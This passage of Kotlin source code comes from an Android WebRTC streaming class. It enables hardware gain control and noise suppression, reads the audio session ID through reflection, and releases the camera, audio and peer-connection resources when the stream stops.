                        FirebaseCrashlytics.getInstance().log("[WebRTC] Hardware AutomaticGainControl enabled (sessionId=$sessionId)")
                    } catch (e: Throwable) {
                        FirebaseCrashlytics.getInstance().log("[WebRTC] Hardware AGC error: ${e.localizedMessage}")
                    }
                }
                if (NoiseSuppressor.isAvailable()) {
                    try {
                        hardwareNs = NoiseSuppressor.create(sessionId)?.apply {
                            enabled = true
                        }
                        FirebaseCrashlytics.getInstance().log("[WebRTC] Hardware NoiseSuppressor enabled (sessionId=$sessionId)")
                    } catch (e: Throwable) {
                        FirebaseCrashlytics.getInstance().log("[WebRTC] Hardware NS error: ${e.localizedMessage}")
                    }
                }
            }
            try {
                audioDeviceModule?.setNoiseSuppressorEnabled(true)
            } catch (_: Throwable) {}
        } catch (e: Throwable) {
            FirebaseCrashlytics.getInstance().log("[WebRTC] enableHardwareAudioEffects notice: ${e.localizedMessage}")
        }
    }

    private fun getAudioSessionIdFromAdm(): Int? {
        return try {
            val audioInputField = audioDeviceModule?.javaClass?.getDeclaredField("audioInput")
            audioInputField?.isAccessible = true
            val audioInput = audioInputField?.get(audioDeviceModule)
            val audioRecordField = audioInput?.javaClass?.getDeclaredField("audioRecord")
            audioRecordField?.isAccessible = true
            val audioRecord = audioRecordField?.get(audioInput) as? android.media.AudioRecord
            audioRecord?.audioSessionId
        } catch (_: Throwable) {
            null
        }
    }

    @Synchronized
    fun stopStream() {
        if (isStopped) return
        isStopped = true
        isCameraRunning = false
        stopAudioLevelMonitoring()

        // Release audio effects
        try { hardwareAgc?.release() } catch (_: Throwable) {}
        hardwareAgc = null
        try { hardwareNs?.release() } catch (_: Throwable) {}
        hardwareNs = null
        try { loudnessEnhancer?.release() } catch (_: Throwable) {}
        loudnessEnhancer = null

        // Stop and dispose camera capturer safely
        try { videoCapturer?.stopCapture() } catch (_: Throwable) {}
        try { videoCapturer?.dispose() } catch (_: Throwable) {}
        videoCapturer = null

        // Dispose surface texture helper
        try { surfaceTextureHelper?.dispose() } catch (_: Throwable) {}
        surfaceTextureHelper = null

        // Dispose video track & source
        try { videoTrack?.setEnabled(false); videoTrack?.dispose() } catch (_: Throwable) {}
        videoTrack = null
        try { videoSource?.dispose() } catch (_: Throwable) {}
        videoSource = null

        // Dispose audio track & source
        try { audioTrack?.setEnabled(false); audioTrack?.dispose() } catch (_: Throwable) {}
        audioTrack = null
        try { audioSource?.dispose() } catch (_: Throwable) {}
        audioSource = null

        // Close peer connection
        try { peerConnection?.dispose() } catch (_: Throwable) {}
        peerConnection = null

        // Release audio device module
        try { audioDeviceModule?.release() } catch (_: Throwable) {}
        audioDeviceModule = null

        // Dispose factory
        try { factory?.dispose() } catch (_: Throwable) {}
        factory = null

        // Release EGL context
        try {
            eglBase.release()
        } catch (t: Throwable) {
            FirebaseCrashlytics.getInstance().log("[WebRTC] eglBase release error: ${t.localizedMessage}")
        }

        synchronized(pendingCandidates) {
            pendingCandidates.clear()
            isRemoteDescriptionSet = false
        }

        FirebaseCrashlytics.getInstance().log("[WebRTC] stopStream() complete — all resources cleanly released")
    }
}
